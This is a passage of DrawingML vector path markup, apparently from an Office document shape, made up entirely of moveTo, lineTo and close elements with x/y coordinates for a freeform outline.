                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13352" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="11262"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12215" y="11555"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12142" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="12325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="11555"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="14049" y="5466"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14196" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15773" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15883" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15993" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16067" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16104" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16104" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16067" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15773" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15517" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15186" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15003" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14526" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14269" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13389" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="13499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="13499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13132" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13389" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="5466"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13646" y="3852"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13609" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13462" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13462" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13132" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11738" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12215" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11738" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="13352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11041" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11738" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="14049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="14600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11958" y="14600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="14636"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="14746"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="14930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12215" y="14966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="14746"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="14049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13132" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="14710"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="14820"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="14930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13352" y="14966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="14966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="14930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13572" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="14820"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14269" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="14049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14379" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14379" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14416" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15003" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15113" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15223" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="13352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15663" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15737" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15773" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15773" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15737" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15700" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15773" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15993" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16177" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16250" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="12435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16470" y="12325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16507" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16507" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16250" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16030" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15883" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16140" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16617" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16984" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17057" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17094" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17131" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17167" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17167" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17131" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17094" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17021" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16764" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16250" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16507" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16727" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16984" y="9978"/>
                  </a:lnTo>
